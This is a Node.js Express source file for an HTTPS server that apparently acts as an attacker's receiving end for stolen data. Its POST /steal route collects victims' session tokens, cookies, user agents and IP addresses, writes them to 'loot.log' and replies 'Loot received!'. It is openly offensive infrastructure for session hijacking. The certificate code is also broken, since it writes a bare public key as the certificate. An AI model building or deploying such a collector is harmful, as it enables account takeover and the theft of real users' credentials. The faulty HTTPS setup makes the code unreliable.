const express = require('express');
const fs = require('fs');
const https = require('https');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(express.json());

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    logStream.write(line);
    console.log(JSON.stringify(entry)); // Also log to stdout for Render logs
}

// --- HTTPS Setup ---
const certDir = path.join(__dirname, 'certs');
const certFile = path.join(certDir, 'cert.pem');
const keyFile = path.join(certDir, 'key.pem');

// Simple self-signed cert generation for dev if files don't exist
if (!fs.existsSync(certDir)) fs.mkdirSync(certDir);
if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
    const crypto = require('crypto');
    const { generateKeyPairSync } = crypto;
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
    fs.writeFileSync(keyFile, privateKey);
    fs.writeFileSync(certFile, publicKey); // Using public as cert for demo structure
}

const httpsOptions = {
    key: fs.readFileSync(keyFile),
    cert: fs.readFileSync(certFile),
};

// --- Routes ---

// 1. Root Route (Fixes the 404)
app.get('/', (req, res) => {
    res.send('<h1>Server is Running</h1><p>Use POST /steal to send loot.</p>');
});

// 2. Steal Route
app.post('/steal', (req, res) => {
    const { token, cookie, userAgent, timestamp } = req.body;

    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing token or cookie' });
    }

    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        ip: req.ip,
        userAgent: userAgent,
        timestamp: timestamp
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Start HTTPS server
const PORT = process.env.PORT || 3000;
const server = https.createServer(httpsOptions, app);

server.listen(PORT, () => {
    console.log(`HTTPS Server running on https://localhost:${PORT}`);
});

module.exports = app;
